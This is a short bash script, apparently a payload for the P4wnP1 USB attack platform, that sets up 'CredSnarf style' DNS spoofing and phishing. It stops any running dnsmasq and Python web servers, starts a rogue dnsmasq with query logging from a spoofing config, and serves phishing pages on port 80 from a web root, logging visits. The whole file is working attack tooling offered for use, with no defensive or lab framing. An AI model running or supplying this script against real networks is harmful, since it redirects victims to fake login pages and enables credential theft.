#!/bin/bash
# Description: DNS spoofing + phishing page delivery (CredSnarf style)

set -euo pipefail

# === Config ===
PAYLOAD_NAME="credsnarf_spoof"
DNSMASQ_CONF="/opt/p4wnp1/config/${PAYLOAD_NAME}_dnsmasq.conf"
WEB_ROOT="/opt/p4wnp1/www"
LOG_DIR="/opt/p4wnp1/logs"
DNS_LOG="$LOG_DIR/${PAYLOAD_NAME}_dnsmasq.log"
WEB_LOG="$LOG_DIR/${PAYLOAD_NAME}_web.log"

mkdir -p "$LOG_DIR" "$WEB_ROOT"
exec > >(tee -a "$LOG_DIR/${PAYLOAD_NAME}.log") 2>&1

echo "[*] Starting CredSnarf-style phishing at $(date)"

# === Validate config ===
[[ -f "$DNSMASQ_CONF" ]] || { echo "[!] Missing config: $DNSMASQ_CONF"; exit 1; }

# === Kill previous rogue services ===
pkill -f dnsmasq || true
pkill -f "python3 -m http.server" || true
sleep 1

# === Start rogue DNS ===
echo "[+] Launching dnsmasq for spoofing..."
dnsmasq --conf-file="$DNSMASQ_CONF" --log-queries --log-facility="$DNS_LOG" &

# === Start phishing HTTP server ===
echo "[+] Serving phishing content from $WEB_ROOT"
cd "$WEB_ROOT"
python3 -m http.server 80 > "$WEB_LOG" 2>&1 &

echo "[✓] CredSnarf spoof running. Logs in $LOG_DIR"
